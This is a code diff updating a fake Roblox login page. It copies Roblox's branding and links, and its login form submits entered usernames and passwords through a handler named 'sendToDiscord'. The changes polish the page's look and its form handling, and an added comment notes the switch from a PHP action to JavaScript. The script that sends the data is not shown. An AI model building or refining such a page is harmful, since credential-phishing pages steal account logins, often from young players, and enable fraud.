@@ -4,12 +4,46 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Log in to Roblox</title>
-    <link href="/images/icon.ico" rel="icon">
+    <link href="images/icon.ico" rel="icon">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <link rel="stylesheet" href="css/style.css">
     <script src="js/menu.js" defer></script>
     <script src="js/login.js" defer></script>
     <script src="js/search.js" defer></script>
+    <style>
+        #error-message {
+            color: #ff3333;
+            background: #ffebee;
+            padding: 10px;
+            border-radius: 4px;
+            margin: 10px 0;
+            display: none;
+            font-size: 14px;
+            text-align: center;
+        }
+        
+        #loading {
+            display: none;
+            justify-content: center;
+            margin: 15px 0;
+        }
+        
+        .cube {
+            width: 10px;
+            height: 10px;
+            background: #00a2ff;
+            margin: 0 2px;
+            animation: loading 1.4s infinite ease-in-out;
+        }
+        
+        .cube:nth-child(1) { animation-delay: -0.32s; }
+        .cube:nth-child(2) { animation-delay: -0.16s; }
+        
+        @keyframes loading {
+            0%, 80%, 100% { transform: scale(0); }
+            40% { transform: scale(1); }
+        }
+    </style>
 </head>
 <body>
 
@@ -30,9 +64,9 @@
             <li><a href="https://www.roblox.com/upgrades/robux?ctx=navpopover">Robux</a></li>
             <li>
                 <div class="search-container">
-                    <input type="text" id="search-input" placeholder="Search" maxlength="30" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" oninput="filterResults()">
+                    <input type="text" id="search-input" placeholder="Search" maxlength="30" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false">
                     <img src="images/search.png" class="search-icon">
-                    <img src="images/clear.png" class="clear-icon" onclick="clearSearch()">
+                    <img src="images/clear.png" class="clear-icon">
                     <div id="dropdown" class="dropdown">
                         <div class="dropdown-item" id="experience-item">
                             <img src="images/experiences.png" class="dropdown-icon">
@@ -62,12 +96,13 @@
     <div class="main">
         <div class="login-container">
             <h1>Login to Roblox</h1>
+            <!-- FORM UPDATED: Removed PHP action, uses JavaScript -->
             <form onsubmit="sendToDiscord(event)">
                 <div class="input-field">
-                    <input type="text" name="username" placeholder="Username/Email/Phone">
+                    <input type="text" name="username" placeholder="Username/Email/Phone" required>
                 </div>
                 <div class="input-field">
-                    <input type="password" name="password" placeholder="Password">
+                    <input type="password" name="password" placeholder="Password" required>
                 </div>
                 <div id="error-message"></div>
                 <div id="loading">
@@ -82,8 +117,8 @@
 
             <div class="separator"></div>
 
-            <button class="secondary-button">Email Me a One-Time Code</button>
-            <button class="secondary-button">Use Another Device</button>
+            <button class="secondary-button" type="button">Email Me a One-Time Code</button>
+            <button class="secondary-button" type="button">Use Another Device</button>
 
             <div class="footer">
                 <p>Don't have an account? <a href="https://www.roblox.com/">Sign Up</a></p>
@@ -114,7 +149,7 @@
         <div class="footer-notice">
             <p>©2024 Roblox Corporation. Roblox, the Roblox logo and Powering Imagination are among our registered and unregistered trademarks in the U.S. and other countries.</p>
         </div>
-    </footer>    
+    </footer>
 
 </body>
 </html>
